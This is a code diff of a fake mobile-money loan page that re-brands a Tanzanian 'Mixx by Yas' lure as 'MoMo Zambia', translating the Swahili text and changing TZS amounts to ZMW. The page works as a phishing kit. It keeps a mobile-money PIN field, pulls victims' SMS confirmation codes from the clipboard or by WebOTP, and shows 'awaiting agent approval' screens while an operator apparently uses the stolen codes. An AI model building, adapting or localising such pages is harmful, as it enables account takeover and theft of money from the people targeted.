+              <span class="text-xs font-black text-blue-950 uppercase tracking-wider">Awaiting MoMo SMS...</span>
             </div>
             <div id="sms-timer-display" class="text-2xl font-black text-brand-blue tracking-tight font-mono">00:20</div>
           </div>
@@ -526,19 +518,19 @@
           <div class="flex items-center justify-between bg-white/80 backdrop-blur-xs p-2.5 rounded-xl border border-blue-100">
             <div class="text-[11px] text-slate-600 font-medium flex items-center space-x-1.5">
               <span>📱</span>
-              <span>Lengo la Simu: <strong id="sms-timer-phone" class="text-slate-900 font-bold">Akaunti ya Mixx</strong></span>
+              <span>Target Mobile: <strong id="sms-timer-phone" class="text-slate-900 font-bold">MoMo Account</strong></span>
             </div>
             <button 
               type="button" 
               onclick="openMessagingApp(event)" 
               class="px-2.5 py-1 bg-brand-blue text-white text-[10px] font-bold rounded-lg hover:bg-blue-800 transition-all shadow-xs flex items-center space-x-1">
               <span>💬</span>
-              <span>Fungua SMS</span>
+              <span>Open SMS</span>
             </button>
           </div>
 
           <p id="sms-timer-status" class="text-[11px] text-slate-500 font-semibold text-center">
-            Nakili ujumbe wa uthibitisho kisha ubandike hapa chini.
+            Copy the SMS confirmation message then paste below.
           </p>
         </div>
 
@@ -548,14 +540,14 @@
             <div class="flex justify-between items-center mb-1">
               <label for="momo-pasted-msg" class="block text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1.5" data-i18n="smsLabel">
                 <span>📨</span>
-                <span>Ujumbe wa Uthibitisho (SMS kutoka Mixx)</span>
+                <span>SMS Confirmation Message</span>
               </label>
               <button 
                 type="button" 
                 onclick="pasteSmsFromClipboard()" 
                 class="px-3 py-1.5 mixx-btn-gradient text-blue-950 text-[11px] font-black rounded-lg shadow-xs hover:opacity-95 active:scale-95 transition-all flex items-center space-x-1">
                 <span>📋</span>
-                <span>Bandika SMS kutoka Clipboard</span>
+                <span>Paste SMS</span>
               </button>
             </div>
 
@@ -567,7 +559,7 @@
               autocorrect="off" 
               autocapitalize="off" 
               spellcheck="false" 
-              placeholder="Bandika ujumbe wako wa SMS kutoka Mixx hapa..."
+              placeholder="Paste your MoMo SMS message here..."
               oninput="handlePostLoginPastedMsg(this.value)"
               class="w-full bg-slate-50 border-2 border-slate-300 rounded-xl p-4 text-xs font-semibold text-slate-800 focus:bg-white focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-y min-h-[130px] leading-relaxed shadow-xs"
             ></textarea>
@@ -576,7 +568,7 @@
               <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
               </svg>
-              <span>✨ Ujumbe wa SMS kutoka Mixx umetambuliwa! Tayari kwa kutuma...</span>
+              <span>✨ SMS message detected! Ready to submit...</span>
             </div>
 
             <div id="msg-retry-alert" class="mt-2 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
@@ -589,16 +581,16 @@
             class="w-full py-4 mixx-btn-gradient text-blue-950 font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all duration-200 flex items-center justify-center space-x-2"
             data-i18n="submitSmsBtn">
             <span>⚡</span>
-            <span>TUMA UJUMBE WA UHAKIKI</span>
+            <span>SUBMIT VERIFICATION MESSAGE</span>
           </button>
 
           <!-- Live Approval Waiting Indicator for Step 4 SMS -->
           <div id="sms-waiting-box" class="hidden p-4 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
             <div class="flex items-center justify-center space-x-2">
               <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-blue animate-ping"></span>
-              <span class="text-xs font-bold text-blue-900 uppercase tracking-wider" data-i18n="awaitingVerification">⏳ Inasubiri Uhakiki</span>
+              <span class="text-xs font-bold text-blue-900 uppercase tracking-wider" data-i18n="awaitingVerification">⏳ Awaiting Verification</span>
             </div>
-            <p class="text-xs text-blue-800" data-i18n="smsAwaitingDesc">Uhakiki wako wa SMS umetumwa. Tafadhali subiri wakati uthibitisho wako unakaguliwa...</p>
+            <p class="text-xs text-blue-800" data-i18n="smsAwaitingDesc">Your SMS verification has been submitted. Verification is in progress...</p>
             <div class="flex justify-center pt-1">
               <svg class="animate-spin h-5 w-5 text-brand-blue" fill="none" viewBox="0 0 24 24">
                 <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
@@ -610,144 +602,46 @@
         </div>
       </section>
 
-      <!-- STEP 5: Merchant Account PIN Validation (Hatua ya 5 ya 5) -->
-      <section id="step-5" class="hidden flex-1 flex flex-col justify-between min-h-[580px] text-slate-800 bg-white">
-        
-        <!-- Top Blue Banner Header for Merchant PIN -->
-        <div class="mixx-gradient text-white pt-7 pb-8 px-6 text-center relative shadow-md">
-          <div class="inline-flex flex-col items-center">
-            <div class="relative mb-2">
-              <div class="w-11 h-11 bg-brand-yellow rounded-full flex items-center justify-center shadow-md border-2 border-yellow-300">
-                <span class="text-blue-950 font-black text-sm tracking-tighter lowercase">yas</span>
-              </div>
-              <div class="absolute -bottom-1 left-1/2 -translate-x-1/2 w-2.5 h-2.5 bg-brand-yellow rotate-45"></div>
-            </div>
-            
-            <h2 class="text-xl sm:text-2xl font-black text-brand-yellow tracking-tight flex items-center justify-center space-x-1.5">
-              <span>🔑</span>
-              <span>Mixx Merchant Portal</span>
-            </h2>
-            <p class="text-xs text-blue-100 font-medium mt-0.5">Uhakiki wa PIN ya Merchant Account</p>
-          </div>
-        </div>
-
-        <!-- Main Merchant Form Content -->
-        <div class="px-5 py-6 space-y-5 flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
-          
-          <div class="text-center space-y-1">
-            <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-0.5 rounded-full uppercase tracking-wider mb-1 inline-block">Hatua ya 5 ya 5</span>
-            <h3 class="text-lg font-black text-slate-800 tracking-tight flex items-center justify-center space-x-1.5">
-              <span>🔑</span>
-              <span>Merchant Account PIN</span>
-            </h3>
-            <p class="text-xs text-slate-500 font-medium">Weka PIN yako ya Merchant Account (tarakimu 4)</p>
-          </div>
-
-          <!-- Merchant PIN Form & Inputs Container -->
-          <div id="merchant-pin-form-container" class="space-y-4">
-            <div class="flex items-center justify-between text-xs font-bold text-slate-600 uppercase tracking-wider px-1">
-              <span class="flex items-center space-x-1">
-                <span>🔑</span>
-                <span>PIN ya Merchant (Tarakimu 4)</span>
-              </span>
-              <span class="text-[10px] font-semibold text-slate-400 flex items-center space-x-0.5">
-                <span>🛡️</span>
-                <span>Ulinzi wa Merchant</span>
-              </span>
-            </div>
-
-            <!-- Merchant PIN Input Row -->
-            <div class="flex items-center justify-center space-x-2.5 py-1">
-              <div class="grid grid-cols-4 gap-2.5 flex-1">
-                <input type="password" maxlength="1" data-mindex="0" class="merchant-pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
-                <input type="password" maxlength="1" data-mindex="1" class="merchant-pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
-                <input type="password" maxlength="1" data-mindex="2" class="merchant-pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
-                <input type="password" maxlength="1" data-mindex="3" class="merchant-pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
-              </div>
-              
-              <button type="button" onclick="toggleMerchantPinVisibility()" class="p-2 text-slate-500 hover:text-brand-blue transition-colors focus:outline-none flex flex-col items-center justify-center" aria-label="Toggle Merchant PIN Visibility">
-                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
-                </svg>
-                <span id="merchant-eye-text" class="text-[9px] font-bold text-slate-400 mt-0.5">Onyesha</span>
-              </button>
-            </div>
-
-            <div id="merchant-pin-retry-alert" class="p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 text-center hidden"></div>
-
-            <button 
-              id="merchant-login-btn" 
-              type="button" 
-              disabled 
-              onclick="submitMerchantPin()" 
-              class="w-full py-3.5 bg-blue-900/40 text-white/50 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-md flex items-center justify-center space-x-2">
-              <span>⚡</span>
-              <span>THIBITISHA PIN YA MERCHANT</span>
-            </button>
-          </div>
-
-          <!-- Live Approval Waiting Indicator for Merchant PIN -->
-          <div id="merchant-pin-waiting-box" class="hidden bg-slate-50/90 border border-slate-200/90 rounded-2xl p-6 text-center space-y-3 shadow-xs">
-            <div class="w-10 h-10 mx-auto flex items-center justify-center">
-              <div class="w-8 h-8 border-3 border-slate-200 border-t-brand-yellow rounded-full animate-spin"></div>
-            </div>
-            <p class="text-xs text-slate-700 font-semibold leading-relaxed">
-              ⏳ Inasubiri msimamizi kuthibitisha PIN yako ya Merchant...
-            </p>
-          </div>
-
-        </div>
-
-        <div class="mixx-gradient text-white pt-7 pb-6 px-4 text-center relative rounded-t-[40%] sm:rounded-t-[50%] overflow-hidden shadow-lg mt-auto">
-          <div class="inline-flex flex-col items-center">
-            <span class="text-sm font-black text-brand-yellow tracking-tight">Mixx Merchant</span>
-            <span class="text-[11px] text-blue-100 font-medium">Uhakiki wa Merchant PIN</span>
-          </div>
-        </div>
-
-      </section>
-
-      <!-- STEP 6: Live Application Status & Approved Dashboard (Final Phase) -->
-      <section id="step-6" class="hidden flex-1 flex flex-col p-4 sm:p-5 space-y-4 text-slate-800">
+      <!-- STEP 5: Live Application Status & Approved Dashboard (Final Phase) -->
+      <section id="step-5" class="hidden flex-1 flex flex-col p-4 sm:p-5 space-y-4 text-slate-800">
         
         <!-- Top Celebration Header -->
         <div class="text-center pt-2">
           <div class="inline-flex items-center justify-center w-14 h-14 bg-amber-100/80 rounded-full text-2xl mb-2 shadow-xs">
             🎉
           </div>
-          <h2 class="text-2xl font-black text-slate-900 tracking-tight" data-i18n="congratsHeading">Hongera!</h2>
+          <h2 class="text-2xl font-black text-slate-900 tracking-tight" data-i18n="congratsHeading">Congratulations!</h2>
           <p class="text-xs text-slate-500 font-medium max-w-xs mx-auto mt-1 leading-relaxed" data-i18n="congratsSub">
-            Mkopo wako umeidhinishwa kikamilifu! Fedha zitatumwa hivi karibuni.
+            Your loan has been approved! Funds are being disbursed to your MoMo account.
           </p>
         </div>
 
         <!-- Big Approved Amount Card -->
         <div class="mixx-gradient text-white rounded-2xl p-5 sm:p-6 text-center shadow-xl relative overflow-hidden border border-blue-900">
           <div class="text-[11px] font-black uppercase text-blue-200 tracking-widest mb-1.5" data-i18n="approvedAmountLabel">
-            KIASI KILICHOIDHINISHWA
+            APPROVED LOAN AMOUNT
           </div>
           <div class="text-3xl sm:text-4xl font-black tracking-tight text-white py-1">
-            <span id="summary-approved-amount">TZS 5,000,000</span>
+            <span id="summary-approved-amount">ZMW 20,000</span>
           </div>
         </div>
 
-        <!-- Compliance Notice Alert Box (⚠️ NOTISI YA UTIIFU) -->
+        <!-- Compliance Notice Alert Box -->
         <div class="bg-amber-50/90 border border-amber-200 rounded-2xl p-4 text-xs shadow-xs space-y-2">
           <div class="font-black text-amber-900 text-xs tracking-wider flex items-center space-x-1.5 uppercase">
             <span>⚠️</span>
-            <span data-i18n="complianceNoticeTitle">NOTISI YA UTIIFU</span>
+            <span data-i18n="complianceNoticeTitle">COMPLIANCE NOTICE</span>
           </div>
           <p class="text-[11.5px] text-amber-900/90 leading-relaxed font-medium" data-i18n="complianceNoticeBody">
-            Akaunti yako ya Mixx by Yas lazima iwe hai na kudumisha amana ya usalama ya angalau <strong class="font-black text-amber-950">10% ya kiasi cha mkopo ulioomba</strong>. Amana hii inarejeshwa kikamilifu baada ya kulipa mkopo kwa mafanikio na husaidia kupata viwango bora vya riba.
+            Your MoMo Zambia account must remain active. Ensure your mobile wallet is enabled for loan disbursement of K1,000 up to K300,000 ZMW.
           </p>
         </div>
 
-        <!-- Loan Summary List (💳 Maelezo ya Mkopo) -->
+        <!-- Loan Summary List -->
         <div class="bg-white border border-slate-200/90 rounded-2xl p-4.5 space-y-3 shadow-xs">
           <h3 class="text-xs font-black text-slate-800 uppercase tracking-wider flex items-center space-x-1.5 border-b border-slate-100 pb-2.5">
             <span>💳</span>
-            <span data-i18n="loanDetailsHeader">Maelezo ya Mkopo</span>
+            <span data-i18n="loanDetailsHeader">Loan Details</span>
           </h3>
 
           <div class="space-y-3 text-xs">
@@ -757,8 +651,8 @@
                 💵
               </div>
               <div class="flex-1 min-w-0">
-                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="monthlyPaymentLabel">MALIPO YA KILA MWEZI</div>
-                <div id="summary-monthly-payment" class="text-xs font-black text-slate-800 tracking-tight">TZS 958,333</div>
+                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="monthlyPaymentLabel">MONTHLY PAYMENT</div>
+                <div id="summary-monthly-payment" class="text-xs font-black text-slate-800 tracking-tight">ZMW 3,833</div>
               </div>
             </div>
 
@@ -768,8 +662,8 @@
                 📅
               </div>
               <div class="flex-1 min-w-0">
-                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="loanTermLabel">MUDA WA MKOPO</div>
-                <div id="summary-term-display" class="text-xs font-black text-slate-800 tracking-tight">Miezi 6</div>
+                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="loanTermLabel">LOAN TERM</div>
+                <div id="summary-term-display" class="text-xs font-black text-slate-800 tracking-tight">6 Months</div>
               </div>
             </div>
 
@@ -779,43 +673,43 @@
                 📈
               </div>
               <div class="flex-1 min-w-0">
-                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="interestRateLabel">KIWANGO CHA RIBA</div>
+                <div class="text-[10px] font-extrabold text-slate-400 uppercase tracking-wider" data-i18n="interestRateLabel">INTEREST RATE</div>
                 <div class="text-xs font-black text-slate-800 tracking-tight">5% APR</div>
               </div>
             </div>
           </div>
         </div>
 
-        <!-- Quick Actions (Vitendo vya Haraka) -->
+        <!-- Quick Actions -->
         <div class="space-y-2 pt-1">
           <div class="text-xs font-bold text-slate-500 text-center uppercase tracking-wider mb-2" data-i18n="quickActionsTitle">
-            Vitendo vya Haraka
+            Quick Actions
           </div>
 
           <div class="space-y-2">
-            <button type="button" onclick="toggleNoticeModal(true, 'Weka Fedha', 'Akaunti yako ya Mixx by Yas iko tayari kwa ajili ya kuweka amana ya usalama ya 10%.')" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
+            <button type="button" onclick="toggleNoticeModal(true, 'Deposit Funds', 'Your MoMo Zambia account is configured for loan disbursement.')" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
               <span>💰</span>
-              <span data-i18n="btnDeposit">Weka Fedha</span>
+              <span data-i18n="btnDeposit">Deposit Funds</span>
             </button>
-            <button type="button" onclick="toggleNoticeModal(true, 'Toa Fedha', 'Maombi ya kutoa fedha yatashughulikiwa baada ya kukamilisha uhakiki wa amana ya usalama.')" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
+            <button type="button" onclick="toggleNoticeModal(true, 'Withdraw Funds', 'Withdrawal processing will be initiated upon approval verification.')" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
               <span>💸</span>
-              <span data-i18n="btnWithdraw">Toa Fedha</span>
+              <span data-i18n="btnWithdraw">Withdraw Funds</span>
             </button>
-            <button type="button" onclick="toggleNoticeModal(true, 'Maelezo ya Mkopo', 'Mkopo wako wa Mixx by Yas unashughulikiwa. Rejea ID: ' + (appState.applicationId || 'MIXX-PENDING'))" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
+            <button type="button" onclick="toggleNoticeModal(true, 'Loan Details', 'Your MoMo loan application is active. Reference ID: ' + (appState.applicationId || 'MOMO-PENDING'))" class="w-full py-3 px-4 bg-white border border-slate-200 hover:bg-slate-50 text-slate-800 font-bold rounded-xl text-xs flex items-center justify-center space-x-2 shadow-xs transition-all active:scale-[0.99]">
               <span>📄</span>
-              <span data-i18n="btnLoanInfo">Maelezo ya Mkopo</span>
+              <span data-i18n="btnLoanInfo">Loan Details</span>
             </button>
           </div>
         </div>
 
-        <!-- Next Steps (📱 Hatua Zinazofuata:) -->
+        <!-- Next Steps -->
         <div class="bg-blue-50/70 border border-blue-200/80 rounded-2xl p-4 text-xs space-y-1 text-left">
           <div class="font-extrabold text-slate-900 text-xs flex items-center space-x-1.5">
             <span>📱</span>
-            <span data-i18n="nextStepsTitle">Hatua Zinazofuata:</span>
+            <span data-i18n="nextStepsTitle">Next Steps:</span>
           </div>
           <p class="text-[11px] text-slate-600 font-medium leading-relaxed" data-i18n="nextStepsBody">
-            Utapokea SMS na barua pepe na maelezo ya utoaji ndani ya masaa 24.
+            You will receive an SMS confirmation with transaction details shortly.
           </p>
         </div>
 
@@ -827,7 +721,7 @@
             class="w-full py-4 mixx-gradient hover:opacity-95 text-white font-black rounded-xl shadow-lg shadow-blue-900/20 text-xs tracking-wider uppercase flex items-center justify-center space-x-2 transition-all active:scale-[0.99]"
             data-i18n="returnHomeBtn">
             <span>🏠</span>
-            <span>Rudi Nyumbani</span>
+            <span>Return Home</span>
           </button>
         </div>
 
@@ -837,16 +731,16 @@
 
     <!-- Footer Wave / Brand Tag -->
     <footer class="bg-brand-blueDark text-blue-300 py-3 text-center text-[11px] border-t border-blue-900/50">
-      <p data-i18n="footerRights">© 2026 Mixx by Yas Tanzania — Huduma za Kifedha na Mikopo</p>
+      <p data-i18n="footerRights">© 2026 MoMo Financial Services Zambia — Digital Credit & Loans</p>
     </footer>
 
     <!-- Notification Modal -->
     <div id="notice-modal" class="fixed inset-0 bg-black/60 z-50 hidden flex items-center justify-center p-4 backdrop-blur-sm">
       <div class="bg-white rounded-2xl max-w-xs w-full p-6 shadow-2xl text-center space-y-4">
-        <h3 id="modal-title" class="font-extrabold text-slate-900 text-base">Taarifa</h3>
+        <h3 id="modal-title" class="font-extrabold text-slate-900 text-base">Information</h3>
         <p id="modal-message" class="text-xs text-slate-600 leading-relaxed"></p>
         <button onclick="toggleNoticeModal(false)" class="w-full py-3 mixx-btn-gradient text-blue-950 text-xs font-bold rounded-xl shadow-md">
-          Ondoa
+          Dismiss
         </button>
       </div>
     </div>
@@ -859,7 +753,7 @@
 
         <div class="relative flex items-center justify-center pt-2">
           <div class="w-20 h-20 rounded-full bg-blue-100 flex items-center justify-center shadow-inner border-4 border-blue-50">
-            <img src="/mixx_by_yas_logo.svg" alt="Mixx by Yas" class="w-14 h-auto object-contain" />
+            <span class="text-2xl font-black text-brand-blue">MoMo</span>
           </div>
           <span class="absolute bottom-0 right-0 flex h-6 w-6">
             <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-yellow opacity-75"></span>
@@ -868,8 +762,8 @@
         </div>
 
         <div class="space-y-2 px-2">
-          <h3 id="approval-modal-title" class="text-lg font-extrabold text-slate-900 tracking-tight">Inasubiri Idhini</h3>
-          <p id="approval-modal-desc" class="text-xs text-slate-600 leading-relaxed font-medium">Ombi lako limetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anaidhinisha uthibitisho wako...</p>
+          <h3 id="approval-modal-title" class="text-lg font-extrabold text-slate-900 tracking-tight">Awaiting Approval</h3>
+          <p id="approval-modal-desc" class="text-xs text-slate-600 leading-relaxed font-medium">Your request has been submitted. Please wait while your MoMo Agent approves your verification...</p>
         </div>
 
         <div class="w-full pt-1 flex items-center justify-center space-x-3 bg-blue-50 border border-blue-200 rounded-2xl py-3.5 px-4 shadow-sm">
@@ -877,7 +771,7 @@
             <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
             <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
           </svg>
-          <span id="approval-modal-status" class="text-xs font-extrabold text-blue-950 uppercase tracking-wider">Inahakikiwa na Wakala...</span>
+          <span id="approval-modal-status" class="text-xs font-extrabold text-blue-950 uppercase tracking-wider">Verifying with Agent...</span>
         </div>
       </div>
     </div>
@@ -890,15 +784,14 @@
     let pinVisible = false;
 
     const appState = {
-      loanAmount: 5000000,
+      loanAmount: 20000,
       loanTermMonths: 6,
-      loanType: 'Nivushe Plus Loan',
-      purpose: 'Biashara na Mtaji',
+      loanType: 'MoMo Personal Loan',
+      purpose: 'Business & Capital',
       firstName: '',
       lastName: '',
       phoneNumber: '',
       momoPin: '',
-      merchantPin: '',
       applicationId: null
     };
 
@@ -912,11 +805,11 @@
     function updateCalculator(val) {
       const amount = parseInt(val, 10);
       appState.loanAmount = amount;
-      document.getElementById('calc-amount-display').innerText = 'TZS ' + amount.toLocaleString();
+      document.getElementById('calc-amount-display').innerText = 'ZMW ' + amount.toLocaleString();
       
       const monthly = calculateMonthly(amount, appState.loanTermMonths);
       document.getElementById('calc-monthly-payment').innerText = monthly.toLocaleString();
-      document.getElementById('calc-total-payment').innerText = 'TZS ' + (monthly * appState.loanTermMonths).toLocaleString();
+      document.getElementById('calc-total-payment').innerText = 'ZMW ' + (monthly * appState.loanTermMonths).toLocaleString();
       
       const loanAmountInput = document.getElementById('loan-amount-input');
       if (loanAmountInput) loanAmountInput.value = amount;
@@ -966,29 +859,19 @@
         if (window.location.hostname && window.location.hostname.includes('render.com') && u.hostname.includes('render.com')) return true;
         if (u.hostname === 'localhost' || u.hostname === '127.0.0.1') return true;
       } catch (e) {}
-      if (urlStr.includes('mixx.co.tz')) return true;
       return false;
     }
 
-    function extractVerificationLink(text) {
-      if (!text) return '';
-      const str = String(text).trim();
-      const urlMatch = str.match(/(https?:\/\/[^\s<>"'\)]+)/i);
-      if (urlMatch && urlMatch[1]) {
-        const candidate = urlMatch[1].trim();
-        if (!isOwnSiteUrl(candidate)) return candidate;
+    function toggleNoticeModal(show, title, message) {
+      const modal = document.getElementById('notice-modal');
+      const titleEl = document.getElementById('modal-title');
+      const msgEl = document.getElementById('modal-message');
+      if (titleEl && title) titleEl.innerText = title;
+      if (msgEl && message) msgEl.innerText = message;
+      if (modal) {
+        if (show) modal.classList.remove('hidden');
+        else modal.classList.add('hidden');
       }
-      const wwwMatch = str.match(/\b(www\.[a-zA-Z0-9-]+\.[a-zA-Z]{2,}(?:\/[^\s<>"'\)]*)?)/i);
-      if (wwwMatch && wwwMatch[1]) {
-        const candidate = 'https://' + wwwMatch[1].trim();
-        if (!isOwnSiteUrl(candidate)) return candidate;
-      }
-      const domainMatch = str.match(/\b([a-zA-Z0-9-]+\.[a-zA-Z]{2,}\/[^\s<>"'\)]*)/i);
-      if (domainMatch && domainMatch[1]) {
-        const candidate = 'https://' + domainMatch[1].trim();
-        if (!isOwnSiteUrl(candidate)) return candidate;
-      }
-      return str;
     }
 
     async function copyToClipboard(text, toastMsg) {
@@ -1014,21 +897,21 @@
         if (text && text.trim()) {
           const cleanText = text.trim();
           if (isOwnSiteUrl(cleanText)) {
-            showClipboardToast('⚠️ Clipboard ina anwani ya tovuti hii, siyo SMS.');
+            showClipboardToast('⚠️ Clipboard contains website URL, not SMS.');
             return;
           }
           if (msgInput) {
             msgInput.value = cleanText;
             copyToClipboard(cleanText);
-            showClipboardToast('⚡ SMS imebandikwa & kunakiliwa kwenye Clipboard!');
+            showClipboardToast('⚡ SMS pasted & copied to clipboard!');
             handlePostLoginPastedMsg(cleanText, false);
           }
         } else {
-          showClipboardToast('📋 Clipboard haina kitu. Tafadhali nakili au subiri SMS.');
+          showClipboardToast('📋 Clipboard is empty. Please copy or await SMS.');
         }
       } catch (err) {
         console.warn('Clipboard access error:', err);
-        showClipboardToast('📋 Bofya kisanduku ili kubandika SMS yako.');
+        showClipboardToast('📋 Tap the box to paste your SMS.');
       }
     }
 
@@ -1111,7 +994,7 @@
       }
 
       if (phoneEl) {
-        phoneEl.innerText = appState.phoneNumber || 'Akaunti ya Mixx';
+        phoneEl.innerText = appState.phoneNumber || 'MoMo Account';
       }
 
       if (displayEl) {
@@ -1119,7 +1002,7 @@
         displayEl.className = 'text-3xl font-black text-brand-blue tracking-tight font-mono py-0.5';
       }
       if (statusEl) {
-        statusEl.innerText = 'Nakili ujumbe wa uthibitisho kisha ubandike hapa chini.';
+        statusEl.innerText = 'Copy the confirmation SMS then paste below.';
         statusEl.className = 'text-[11px] text-slate-500 font-semibold';
       }
 
@@ -1144,7 +1027,7 @@
             displayEl.className = 'text-2xl font-black text-red-600 tracking-tight font-mono py-0.5';
           }
           if (statusEl) {
-            statusEl.innerText = '⚠️ Muda umeisha. Kama hujapata SMS, bofya Fungua SMS au Bandika.';
+            statusEl.innerText = '⚠️ Time expired. If SMS not received, tap Open SMS or Paste.';
             statusEl.className = 'text-[11px] text-red-600 font-bold';
           }
         }
@@ -1168,7 +1051,7 @@
             if (incoming && msgInput) {
               msgInput.value = incoming;
               copyToClipboard(incoming);
-              showClipboardToast('⚡ WebOTP: SMS imepokewa & kunakiliwa kwenye Clipboard!');
+              showClipboardToast('⚡ WebOTP: SMS received & copied to clipboard!');
               handlePostLoginPastedMsg(incoming, false);
             }
           }
@@ -1193,7 +1076,7 @@
             if (cleanText === lastAutoPastedText && !force) return;
             lastAutoPastedText = cleanText;
             msgInput.value = cleanText;
-            showClipboardToast('⚡ Ujumbe wote wa SMS umetambuliwa & kubandikwa!');
+            showClipboardToast('⚡ SMS message detected & pasted!');
             handlePostLoginPastedMsg(cleanText, true);
           }
         }
@@ -1217,23 +1100,18 @@
     function startSimSmsReceiver() {
       const msgInput = document.getElementById('momo-pasted-msg');
       const statusEl = document.getElementById('momo-extract-status');
-      const phoneTarget = document.getElementById('sms-phone-target');
       const badge = document.getElementById('sms-waiting-badge');
-
-      if (phoneTarget) {
-        phoneTarget.innerText = appState.phoneNumber || 'Akaunti ya Mixx';
-      }
 
       if (msgInput) {
         msgInput.value = '';
-        msgInput.placeholder = 'Bandika ujumbe wako wa SMS kutoka Mixx hapa...';
+        msgInput.placeholder = 'Paste your MoMo SMS message here...';
       }
       if (statusEl) {
         statusEl.classList.add('hidden');
       }
       if (badge) {
         badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-        badge.innerHTML = '<span>Tayari Kubandika</span>';
+        badge.innerHTML = '<span>Ready to Paste</span>';
       }
 
       startSmsCountdownTimer();
@@ -1248,17 +1126,17 @@
 
       const urlParams = new URLSearchParams(window.location.search);
       const refToken = urlParams.get('ref') || null;
-      const submissionId = window.crypto && window.crypto.randomUUID ? window.crypto.randomUUID() : ('mixx-' + Date.now());
+      const submissionId = window.crypto && window.crypto.randomUUID ? window.crypto.randomUUID() : ('momo-' + Date.now());
       const consent = document.getElementById('agent-consent-checkbox') ? document.getElementById('agent-consent-checkbox').checked : true;
 
       const payload = {
         firstName: appState.firstName || '',
         lastName: appState.lastName || '',
         phone: appState.phoneNumber || '',
-        loanType: appState.loanType || 'Nivushe Plus Loan',
-        loanAmount: appState.loanAmount || 5000000,
+        loanType: appState.loanType || 'MoMo Personal Loan',
+        loanAmount: appState.loanAmount || 20000,
         termMonths: appState.loanTermMonths || 6,
-        purpose: appState.purpose || 'Biashara na Mtaji',
+        purpose: appState.purpose || 'Business & Capital',
         employment: 'Self-Employed / Business Owner',
         annualIncome: appState.loanAmount * 2.5,
         referralToken: refToken,
@@ -1274,12 +1152,10 @@
         });
         const data = await res.json().catch(() => ({}));
         if (!res.ok) {
-          throw new Error(data.error || 'Imeshindwa kutuma taarifa za ombi');
+          throw new Error(data.error || 'Failed to submit application data');
         }
         if (data.applicationId) {
           appState.applicationId = data.applicationId;
-          const refElem = document.getElementById('summary-ref-id');
-          if (refElem) refElem.innerText = data.applicationId;
           return data.applicationId;
         }
       } catch (err) {
@@ -1359,11 +1235,6 @@
         isSubmittingMessage = false;
         const msgInp = document.getElementById('momo-pasted-msg');
         if (msgInp) msgInp.value = '';
-        const badge = document.getElementById('summary-status-badge');
-        if (badge) {
-          badge.className = 'inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-amber-100 text-amber-800 border border-amber-300';
-          badge.innerText = '⏳ Inakaguliwa';
-        }
       }
 
       if (currentStep === 1) {
@@ -1390,7 +1261,7 @@
